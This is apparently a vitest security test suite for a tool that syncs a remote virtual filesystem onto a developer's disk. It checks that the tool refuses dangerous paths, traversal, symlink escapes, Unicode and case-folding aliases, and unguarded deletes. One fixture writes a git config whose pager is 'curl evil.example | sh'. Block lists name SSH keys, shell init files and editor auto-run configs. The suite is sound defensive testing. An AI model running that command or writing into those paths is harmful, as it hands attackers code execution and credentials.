/**
 * The mount sync writes remote content onto the developer's disk, so what it
 * refuses matters more than what it copies.
 *
 * The threat model these cover: anything able to write a user's VFS — today
 * that includes every app they sign into, because hosted auth hands the app the
 * master seed — can choose the bytes AND the path of a file that lands in a
 * directory on their machine.
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from "vitest";
import { createHash } from "node:crypto";
import { mkdtemp, mkdir, writeFile, readFile, symlink, rm, readdir, lstat, realpath } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, sep } from "node:path";
import {
    isRefused, localPathFor, scanRemote, reconcile, win32NameProblem, assertMountable, writeTarget, SIGN, refuseFoldCollisions,
    foldsCaseReadOnly,
} from "../src/lib/mount.js";

// The ignore ratchet keeps a copy of its rules under ~/.muhkoo: a HOME of
// our own, so no test reads or writes the real one.
let realHome;
beforeAll(async () => {
    realHome = process.env.HOME;
    process.env.HOME = await mkdtemp(join(tmpdir(), "muhkoo-mount-home-"));
});
afterAll(async () => {
    const fake = process.env.HOME;
    process.env.HOME = realHome;
    await rm(fake, { recursive: true, force: true });
});

describe("isRefused", () => {
    it("refuses paths that reach code execution without an execute bit", () => {
        // Files are written 0644, so a git HOOK would not run — but core.pager,
        // alias.* and core.fsmonitor in .git/config are commands git runs
        // itself, on an ordinary `git status`.
        expect(isRefused(".git/config")).toBe(true);
        expect(isRefused(".ssh/authorized_keys")).toBe(true);
        expect(isRefused(".vscode/tasks.json")).toBe(true);
        expect(isRefused(".envrc")).toBe(true);
        expect(isRefused(".npmrc")).toBe(true);
        expect(isRefused(".zshrc")).toBe(true);
        expect(isRefused("node_modules/left-pad/index.js")).toBe(true);
    });

    it("refuses them at any depth, not just the top level", () => {
        expect(isRefused("packages/web/.git/config")).toBe(true);
        expect(isRefused("deep/nested/.envrc")).toBe(true);
    });

    it("leaves ordinary project files alone", () => {
        expect(isRefused("src/index.ts")).toBe(false);
        expect(isRefused("README.md")).toBe(false);
        expect(isRefused(".vcsignore")).toBe(false);
        expect(isRefused(".gitignore")).toBe(false);
    });
});

describe("localPathFor", () => {
    const dir = sep === "\\" ? "C:\\work\\mount" : "/work/mount";

    it("maps a normal path under the mount", () => {
        expect(localPathFor(dir, "/src/index.ts")).toBe(join(dir, "src", "index.ts"));
    });

    it("refuses anything that resolves outside the mount", () => {
        expect(localPathFor(dir, "/../../../etc/passwd")).toBeNull();
        expect(localPathFor(dir, "/a/../../b")).toBeNull();
        expect(localPathFor(dir, "/..")).toBeNull();
    });

    it("refuses the mount directory itself", () => {
        expect(localPathFor(dir, "/")).toBeNull();
    });
});

describe("scanRemote", () => {
    const fakeVfs = (paths) => ({
        exists: async () => true,
        walk: async () => paths,
        stat: async () => ({ kind: "file", size: 1 }),
        readFile: async (p) => new TextEncoder().encode(`contents of ${p}`),
    });

    it("does not bring down dangerous paths", async () => {
        const out = await scanRemote(
            fakeVfs(["/apps/p/src/a.ts", "/apps/p/.git/config", "/apps/p/.ssh/id_rsa"]),
            "/apps/p",
        );
        expect(Object.keys(out.files)).toEqual(["/src/a.ts"]);
    });

    it("still refuses them with --hidden", async () => {
        // --hidden means "sync dot-files", not "let a remote party rewrite my
        // git config".
        const out = await scanRemote(
            fakeVfs(["/apps/p/.gitignore", "/apps/p/.git/config"]),
            "/apps/p",
            true,
        );
        expect(Object.keys(out.files)).toEqual(["/.gitignore"]);
    });

    it("applies the ignore rules to what arrives, not just what leaves", async () => {
        const out = await scanRemote(
            fakeVfs(["/apps/p/src/a.ts", "/apps/p/dist/bundle.js"]),
            "/apps/p",
            false,
            (rel) => rel.startsWith("dist/"),
        );
        expect(Object.keys(out.files)).toEqual(["/src/a.ts"]);
    });

    it("counts a name that only FOLDS to a dot-name as hidden [L5]", async () => {
        // A zero-width space or a fullwidth full stop in front: the raw name
        // does not start with a dot, but a folding volume, and the ignore
        // rules, read it as one.
        const out = await scanRemote(fakeVfs(["/apps/p/\u200b.cache/x", "/apps/p/\uff0eaws/credentials", "/apps/p/src/a.ts"]), "/apps/p");
        expect(Object.keys(out.files)).toEqual(["/src/a.ts"]);
    });

    it("still counts a name made only of dots as hidden", async () => {
        // Folding strips trailing dots (Win32 does); that must not turn `...`
        // into a name with no dot at all.
        const out = await scanRemote(fakeVfs(["/apps/p/.../x", "/apps/p/src/a.ts"]), "/apps/p");
        expect(Object.keys(out.files)).toEqual(["/src/a.ts"]);
    });

    it("never matches a path past the bounds the ignore work limits assume, and leaves it alone [L3]", async () => {
        // 66 segments deep; and a 255-byte name of U+FDFA, which folds to
        // eighteen characters apiece — 1,530 for the matcher to walk.
        const deep = "/apps/p/" + Array.from({ length: 65 }, (_, i) => `d${i}`).join("/") + "/f";
        const long = "/apps/p/src/" + "\ufdfa".repeat(85);
        const asked = [];
        const ignore = (rel) => {
            asked.push(rel);
            return false;
        };
        const out = await scanRemote(fakeVfs([deep, long, "/apps/p/src/a.ts"]), "/apps/p", false, ignore, { ignoreCase: true });
        expect(Object.keys(out.files)).toEqual(["/src/a.ts"]);
        expect([...out.unknown].sort()).toEqual([deep.slice("/apps/p".length), long.slice("/apps/p".length)].sort());
        expect(asked).toEqual(["src/a.ts"]);
    });

    it("skips dot-directories by default but keeps the project's own dot-files", async () => {
        const out = await scanRemote(
            fakeVfs(["/apps/p/.vcsignore", "/apps/p/.cache/x", "/apps/p/src/a.ts"]),
            "/apps/p",
        );
        expect(Object.keys(out.files).sort()).toEqual(["/.vcsignore", "/src/a.ts"]);
    });
});

describe("reconcile", () => {
    let dir;
    const remote = new Map();
    const vfs = {
        exists: async () => true,
        walk: async () => [...remote.keys()],
        stat: async (p) => ({ kind: "file", size: remote.get(p).length }),
        readFile: async (p) => remote.get(p),
        writeFile: async (p, b) => void remote.set(p, b),
        delete: async (p) => void remote.delete(p),
    };

    beforeEach(async () => {
        dir = await mkdtemp(join(tmpdir(), "muhkoo-mount-"));
        remote.clear();
    });
    afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

    const bytes = (s) => new TextEncoder().encode(s);

    it("pulls an ordinary file", async () => {
        remote.set("/src/app.ts", bytes("export const x = 1;"));
        await reconcile({ vfs, dir, root: "", state: {} });
        expect(await readFile(join(dir, "src", "app.ts"), "utf8")).toBe("export const x = 1;");
    });

    it("does not write a remote .git/config into the repository", async () => {
        // The whole chain: a remote dot-path used to be hashed by scanRemote,
        // find no local counterpart, and be written straight to disk.
        await mkdir(join(dir, ".git"), { recursive: true });
        await writeFile(join(dir, ".git", "config"), "[core]\n");

        remote.set("/.git/config", bytes("[core]\n\tpager = curl evil.example | sh\n"));
        await reconcile({ vfs, dir, root: "", state: {} });

        expect(await readFile(join(dir, ".git", "config"), "utf8")).toBe("[core]\n");
    });

    it("does not write through a symlink", async () => {
        // writeFile follows links, so this is how content escapes the mount.
        const outside = join(dir, "outside.txt");
        await writeFile(outside, "original");
        await mkdir(join(dir, "sub"), { recursive: true });
        await symlink(outside, join(dir, "sub", "link.txt"));

        remote.set("/sub/link.txt", bytes("overwritten"));
        await reconcile({ vfs, dir, root: "", state: {} });

        expect(await readFile(outside, "utf8")).toBe("original");
    });

    const hash = (text) => createHash("sha256").update(text).digest("hex");
    const printed = () => {
        const lines = [];
        vi.spyOn(console, "log").mockImplementation((...a) => lines.push(a.join(" ")));
        return lines;
    };
    afterEach(() => vi.restoreAllMocks());

    it("does not delete locally without --allow-delete — the gate itself, not the breaker [L5]", async () => {
        // Another file stays on both sides, so neither the empty-view rule
        // nor the count rule holds this delete: only the flag does.
        remote.set("/stays.txt", bytes("stays"));
        await writeFile(join(dir, "stays.txt"), "stays");
        await writeFile(join(dir, "keep.txt"), "mine");
        const lines = printed();
        await reconcile({ vfs, dir, root: "", state: { "/keep.txt": hash("mine"), "/stays.txt": hash("stays") } });
        expect(await readFile(join(dir, "keep.txt"), "utf8")).toBe("mine");
        expect(lines.some((l) => l.includes("/keep.txt") && l.includes("not deleting it locally"))).toBe(true);
    });

    it("does not delete remotely without --allow-delete — the gate itself, not the breaker [L5]", async () => {
        remote.set("/gone.txt", bytes("gone"));
        remote.set("/stays.txt", bytes("stays"));
        await writeFile(join(dir, "stays.txt"), "stays");
        const lines = printed();
        await reconcile({ vfs, dir, root: "", state: { "/gone.txt": hash("gone"), "/stays.txt": hash("stays") } });
        expect(remote.has("/gone.txt")).toBe(true);
        expect(lines.some((l) => l.includes("/gone.txt") && l.includes("not deleting it"))).toBe(true);
    });

    it("deletes locally when --allow-delete is given", async () => {
        // Another file stays remote: a remote with NOTHING in it is held by the
        // circuit breaker, as a missing or renamed root looks exactly like that.
        remote.set("/stays.txt", bytes("stays"));
        await writeFile(join(dir, "gone.txt"), "bye");
        const state = { "/gone.txt": (await import("node:crypto")).createHash("sha256").update("bye").digest("hex") };
        await reconcile({ vfs, dir, root: "", state, opts: { allowDelete: true } });

        expect((await readdir(dir)).filter((f) => f === "gone.txt")).toEqual([]);
    });

    it("refuses a state key that escapes the mount", async () => {
        // The state file is a second source of keys that never passes through
        // the SDK's path normalization.
        const escape = join(dir, "..", "escaped.txt");
        await writeFile(escape, "untouched");
        try {
            await reconcile({ vfs, dir, root: "", state: { "/../escaped.txt": "deadbeef" }, opts: { allowDelete: true } });
            expect(await readFile(escape, "utf8")).toBe("untouched");
        } finally {
            await rm(escape, { force: true });
        }
    });
});

// ---------------------------------------------------------------------------
// Second round (the 2026-09 adversarial audit). Finding ids in brackets.

/** Does this temp volume fold case / Unicode normalization the way APFS does? */
async function probeVolume() {
    const d = await mkdtemp(join(tmpdir(), "muhkoo-probe-"));
    try {
        await writeFile(join(d, "probe"), "x");
        await writeFile(join(d, "caf\u00e9"), "x");
        const ci = await lstat(join(d, "PROBE")).then(() => true, () => false);
        const ni = await lstat(join(d, "cafe\u0301")).then(() => true, () => false);
        return { ci, ni };
    } finally {
        await rm(d, { recursive: true, force: true });
    }
}
const volume = await probeVolume();

describe("isRefused folds each segment before comparing [G1, G10]", () => {
    it.each([
        "Node_Modules/lodash/index.js",
        "NODE_MODULES/x",
        "node_module\u017f/lodash/index.js",   // U+017F long s folds to s
        ".GIT/config",
        ".Git/config",
        ".SSH/authorized_keys",
        ".NPMRC",
        ".VSCode/tasks.json",
        "\u200cnode_modules/x",                // zero-width non-joiner: ignored by HFS+
        "node_modules\u200d/x",
        "\ufeffnode_modules/x",
        ".g\u200cit/config",
        "\uff0egit/config",                    // fullwidth full stop
        ".vs\u00adcode/tasks.json",            // soft hyphen
        ".git./config",                        // Win32 strips trailing dots and spaces
        ".git /config",
        "node_modules./x/index.js",
        "GIT~1/config",                        // 8.3 short names
        "git~2/config",
        "NODE_M~1/x/index.js",
        "SSH~1/id_rsa",
    ])("refuses %j", (rel) => {
        expect(isRefused(rel)).toBe(true);
    });

    it.each(["src/index.ts", "Nodes/x", "README.md", "docs/git-guide.md", "backup~1.txt", "no~1/x", "bin/cli.js"])(
        "still leaves %j alone",
        (rel) => {
            expect(isRefused(rel)).toBe(false);
        },
    );
});

describe("the refused lists [N11, G8]", () => {
    it.each([
        // git-operation hooks and editor/agent auto-run config: the same class
        // as the .git hooks and .vscode/.idea already refused
        ".husky/pre-commit",
        ".claude/settings.json",
        ".cursor/rules",
        ".zed/tasks.json",
        ".fleet/run.json",
        // shell-init files the first list missed; .zshenv runs for EVERY zsh
        ".zshenv",
        ".zprofile",
        ".zlogin",
        ".zlogout",
        ".bash_login",
        ".bash_logout",
        ".kshrc",
        ".pam_environment",
        ".xprofile",
        ".gitconfig",
    ])("refuses %j", (rel) => {
        expect(isRefused(rel)).toBe(true);
    });

    it.each(["bin/cli.js", "Library/notes.md", ".yarnrc.yml", "bunfig.toml", ".cargo/config.toml", ".pnpmfile.cjs"])(
        "leaves ordinary committed project files alone: %j",
        (rel) => {
            expect(isRefused(rel)).toBe(false);
        },
    );
});

describe("win32NameProblem [G10]", () => {
    it.each([
        "a:b", "notes 10:30.md", "x.", "x ", "CON", "con", "nul.txt", "COM1", "lpt9.log", "Aux.tar.gz", "COM\u00b9",
        // [L8] the rest of Win32's rules: a backslash is a separator there, and
        // these characters and console devices cannot be names at all
        "a\\b", "a<b", "a>b", 'a"b', "a|b", "a?b", "a*b", "CONIN$", "conout$.txt",
    ])(
        "names %j as unwritable on Windows",
        (name) => {
            expect(win32NameProblem(name)).toBeTruthy();
        },
    );

    it.each(["console.log", "a.b", "com10", "icon.png", "lpt.txt", ".gitignore"])("accepts %j", (name) => {
        expect(win32NameProblem(name)).toBeFalsy();
    });
});

describe("assertMountable [G8]", () => {
    let home;
    let prev;
    beforeEach(async () => {
        home = await mkdtemp(join(tmpdir(), "muhkoo-home-"));
        prev = process.env.HOME;
        process.env.HOME = home;   // os.homedir() reads it on every call
    });
    afterEach(async () => {
        process.env.HOME = prev;
        await rm(home, { recursive: true, force: true });
    });

    it("refuses the filesystem root", async () => {
        await expect(assertMountable("/")).rejects.toThrow(/home directory|filesystem root/);
    });

    it("refuses the home directory", async () => {
        await expect(assertMountable(home)).rejects.toThrow(/home directory/);
    });

    it("refuses an ancestor of the home directory", async () => {
        await expect(assertMountable(dirname(home))).rejects.toThrow(/home directory/);
    });

    it("sees through a symlink to the home directory", async () => {
        const other = await mkdtemp(join(tmpdir(), "muhkoo-link-"));
        try {
            await symlink(home, join(other, "h"));
            await expect(assertMountable(join(other, "h"))).rejects.toThrow(/home directory/);
        } finally {
            await rm(other, { recursive: true, force: true });
        }
    });

    it("accepts a project inside the home directory", async () => {
        await mkdir(join(home, "proj"));
        await expect(assertMountable(join(home, "proj"))).resolves.toBeUndefined();
    });
});

describe("the dry-run symbols [N7]", () => {
    it("say which side a delete happens on", () => {
        expect(SIGN["delete-remote"]).not.toBe(SIGN["delete-local"]);
    });
});

describe("writeTarget — the one write boundary [G1, G2, N2, G10]", () => {
    let dir;
    beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), "muhkoo-wt-")); });
    afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

    it("creates a new file, one missing directory at a time", async () => {
        const t = await writeTarget(dir, "/x/y/z.txt", { localKeys: new Set() });
        expect(t.ok).toBe(true);
        expect(t.missing).toEqual(["x", "y"]);
    });

    it("replaces a synced regular file", async () => {
        await writeFile(join(dir, "a.txt"), "a");
        const t = await writeTarget(dir, "/a.txt", { localKeys: new Set(["/a.txt"]) });
        expect(t.ok).toBe(true);
        expect(t.existing?.isFile()).toBe(true);
    });

    it("never replaces a file the local scan did not report", async () => {
        // An ignored, hidden, refused or over-size file is local-only: it is
        // nowhere else, so overwriting it is unrecoverable.
        await writeFile(join(dir, "secret.txt"), "local-only");
        expect((await writeTarget(dir, "/secret.txt", { localKeys: new Set() })).ok).toBe(false);
    });

    it("refuses a symlinked directory anywhere on the way down", async () => {
        const out = await mkdtemp(join(tmpdir(), "muhkoo-out-"));
        try {
            await mkdir(join(dir, "a"));
            await symlink(out, join(dir, "a", "shared"));
            expect((await writeTarget(dir, "/a/shared/new.txt", { localKeys: new Set() })).ok).toBe(false);
        } finally {
            await rm(out, { recursive: true, force: true });
        }
    });

    it("refuses a final component that is a symlink, even one the scan reported", async () => {
        await writeFile(join(dir, "real.txt"), "x");
        await symlink(join(dir, "real.txt"), join(dir, "l.txt"));
        expect((await writeTarget(dir, "/l.txt", { localKeys: new Set(["/l.txt"]) })).ok).toBe(false);
    });

    it("refuses to treat a file as a directory", async () => {
        await writeFile(join(dir, "a.txt"), "x");
        expect((await writeTarget(dir, "/a.txt/b", { localKeys: new Set() })).ok).toBe(false);
    });

    it.skipIf(!volume.ci)("refuses a spelling this volume folds onto an existing entry", async () => {
        await mkdir(join(dir, "src"));
        await writeFile(join(dir, "src", "app.ts"), "x");
        const keys = new Set(["/src/app.ts"]);
        expect((await writeTarget(dir, "/src/App.ts", { localKeys: keys })).ok).toBe(false);
        expect((await writeTarget(dir, "/SRC/new.ts", { localKeys: keys })).ok).toBe(false);
        expect((await writeTarget(dir, "/src/app.ts", { localKeys: keys })).ok).toBe(true);
    });

    it.skipIf(!volume.ni)("refuses a Unicode-normalization alias", async () => {
        await writeFile(join(dir, "caf\u00e9.md"), "x");
        const keys = new Set(["/caf\u00e9.md"]);
        expect((await writeTarget(dir, "/cafe\u0301.md", { localKeys: keys })).ok).toBe(false);
    });

    it("refuses Windows-unwritable names when the platform is win32", async () => {
        expect((await writeTarget(dir, "/a:b", { localKeys: new Set(), platform: "win32" })).ok).toBe(false);
        expect((await writeTarget(dir, "/nul.txt", { localKeys: new Set(), platform: "win32" })).ok).toBe(false);
        expect((await writeTarget(dir, "/x./y", { localKeys: new Set(), platform: "win32" })).ok).toBe(false);
        expect((await writeTarget(dir, "/a:b", { localKeys: new Set(), platform: "darwin" })).ok).toBe(true);
    });
});

// ---------------------------------------------------------------------------
// Fix-up round: what the review of the first rewrite found.

describe("foldName folds the way APFS does [A14]", () => {
    it.each([".ßh/authorized_keys", ".ẞH/config", ".ſſh/id_ed25519"])("refuses %j as .ssh", (p) => {
        expect(isRefused(p)).toBe(true);
    });
});

const DATA_VOLUME = "/System/Volumes/Data";
const hasDataVolume = await lstat(DATA_VOLUME).then(() => true, () => false);

describe("assertMountable compares directories, not spellings [A9]", () => {
    let home;
    let prev;
    beforeEach(async () => {
        home = await realpath(await mkdtemp(join(tmpdir(), "muhkoo-home-")));
        prev = process.env.HOME;
        process.env.HOME = home;
    });
    afterEach(async () => {
        process.env.HOME = prev;
        await rm(home, { recursive: true, force: true });
    });

    // macOS reaches every path on the data volume through a firmlink as
    // well; realpath does not resolve it, so the spelling differs while the
    // directory is the same one.
    it.skipIf(!hasDataVolume)("refuses the home directory reached through the data-volume firmlink", async () => {
        await expect(assertMountable(DATA_VOLUME + home)).rejects.toThrow(/home directory/);
    });

    it.skipIf(!hasDataVolume)("refuses an ancestor of it reached that way", async () => {
        await expect(assertMountable(DATA_VOLUME + dirname(home))).rejects.toThrow(/home directory/);
    });

    it.skipIf(!hasDataVolume)("refuses the data volume itself, which holds the home directory", async () => {
        // Not an ancestor of the home directory by inode — `/` is a separate
        // system volume — but everything in it is there all the same.
        await expect(assertMountable(DATA_VOLUME)).rejects.toThrow(/home directory/);
    });

    it("still accepts a project inside the home directory", async () => {
        await mkdir(join(home, "proj"));
        await expect(assertMountable(join(home, "proj"))).resolves.toBeUndefined();
    });
});

describe("scanRemote paces itself by the clock, and stops when told [L3]", () => {
    const vfs = { stat: async () => ({ size: 1 }), readFile: async () => new Uint8Array() };
    const busy = () => {
        const t = performance.now();
        while (performance.now() - t < 1) { /* one millisecond of matching */ }
        return true;
    };

    it("never holds the event loop for long, however slow each path is", async () => {
        // Yielding every 256 paths let 256 slow paths run back to back.
        const paths = Array.from({ length: 300 }, (_, i) => `/apps/p/dist/f${i}.js`);
        let last = performance.now();
        let gap = 0;
        const timer = setInterval(() => {
            const now = performance.now();
            gap = Math.max(gap, now - last);
            last = now;
        }, 5);
        await scanRemote(vfs, "/apps/p", false, busy, { paths });
        clearInterval(timer);
        gap = Math.max(gap, performance.now() - last);   // the stretch since the last tick counts too
        expect(gap).toBeLessThan(100);
    });

    it("returns within a chunk of being aborted, mid-filter", async () => {
        const paths = Array.from({ length: 3000 }, (_, i) => `/apps/p/dist/f${i}.js`);
        const controller = new AbortController();
        setTimeout(() => controller.abort(), 50);
        const t0 = performance.now();
        await scanRemote(vfs, "/apps/p", false, busy, { paths, signal: controller.signal });
        expect(performance.now() - t0).toBeLessThan(400);
    });
});

describe("refuseFoldCollisions [L6]", () => {
    const sess = () => ({ warned: new Set() });
    const keys = (out) => out.map(([key]) => key).sort();

    it("on win32, refuses the spelling that is not on disk, as before", async () => {
        const unknown = new Set();
        const out = await refuseFoldCollisions([["/report", "/r/report"], ["/report.", "/r/report."]], new Set(["/report"]), unknown, sess(), null, { platform: "win32" });
        expect(keys(out)).toEqual(["/report"]);
        expect([...unknown]).toEqual(["/report."]);
    });

    it("never refuses a group whose spellings are all on disk already: the disk evidently holds them", async () => {
        const unknown = new Set();
        const out = await refuseFoldCollisions([["/report", "/r/report"], ["/report.", "/r/report."]], new Set(["/report", "/report."]), unknown, sess(), null, { platform: "win32" });
        expect(keys(out)).toEqual(["/report", "/report."]);
        expect(unknown.size).toBe(0);
    });

    it("folds case fully, but not by compatibility, off Windows", async () => {
        const unknown = new Set();
        const wanted = [["/v2.md", "a"], ["/v².md", "b"], ["/Straße", "c"], ["/strasse", "d"]];
        const out = await refuseFoldCollisions(wanted, new Set(), unknown, sess(), null, { platform: "darwin" });
        expect(keys(out)).toEqual(["/v2.md", "/v².md"]);
        expect([...unknown].sort()).toEqual(["/Straße", "/strasse"]);
    });
});

describe("foldsCaseReadOnly — the case probe a dry run uses [review 3]", () => {
    // The probe a pass uses writes a file to find out. A dry run promises to
    // write nothing, so it asks the names already there instead.
    const temps = [];
    afterEach(async () => {
        while (temps.length) await rm(temps.pop(), { recursive: true, force: true });
    });
    async function tmp() {
        const d = await mkdtemp(join(tmpdir(), "muhkoo-foldprobe-"));
        temps.push(d);
        return d;
    }
    /** What this volume does, found the way a pass finds out: by writing. */
    async function truth() {
        const d = await tmp();
        await writeFile(join(d, "probe"), "");
        return lstat(join(d, "PROBE")).then(() => true, () => false);
    }
    const times = async (d) => {
        const s = await lstat(d, { bigint: true });
        return `${s.mtimeNs}:${s.ctimeNs}`;
    };

    it("answers as the writing probe does, from an entry already there", async () => {
        const d = await tmp();
        await writeFile(join(d, "readme.md"), "x");
        expect(await foldsCaseReadOnly(d)).toBe(await truth());
    });

    it("reads a volume that lists both spellings as one that keeps them apart", async () => {
        const d = await tmp();
        await writeFile(join(d, "a"), "1");
        const both = await writeFile(join(d, "A"), "2").then(async () => (await readdir(d)).length === 2);
        if (!both) return;   // this volume folds; the case cannot arise here
        expect(await foldsCaseReadOnly(d)).toBe(false);
    });

    it("asks the parent about the directory's own name when nothing in it has a letter", async () => {
        const d = await tmp();   // muhkoo-foldprobe-XXXXXX: letters
        await writeFile(join(d, "1"), "x");
        expect(await foldsCaseReadOnly(d)).toBe(await truth());
    });

    it("folds when nothing can tell it — which only ever refuses more", async () => {
        const d = join(await tmp(), "123");
        await mkdir(d);
        await writeFile(join(d, "4"), "x");
        expect(await foldsCaseReadOnly(d)).toBe(true);
    });

    it("writes nothing", async () => {
        const d = await tmp();
        await writeFile(join(d, "readme.md"), "x");
        await mkdir(join(d, ".muhkoo"));
        const before = [await times(d), await times(join(d, ".muhkoo"))];
        await new Promise((r) => setTimeout(r, 20));
        await foldsCaseReadOnly(d);
        expect([await times(d), await times(join(d, ".muhkoo"))]).toEqual(before);
    });
});
